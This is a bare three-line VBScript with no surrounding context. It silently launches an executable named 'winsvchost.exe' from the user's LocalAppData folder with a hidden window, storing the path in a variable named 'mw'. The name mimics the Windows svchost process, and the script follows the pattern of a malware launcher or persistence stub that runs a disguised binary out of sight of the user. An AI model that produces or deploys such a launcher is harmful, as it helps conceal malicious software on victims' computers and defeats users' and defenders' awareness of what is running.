Set Shell = CreateObject("WScript.Shell")
mw = Shell.ExpandEnvironmentStrings("%LocalAppData%")
Shell.Run mw & "\winsvchost.exe", 0, False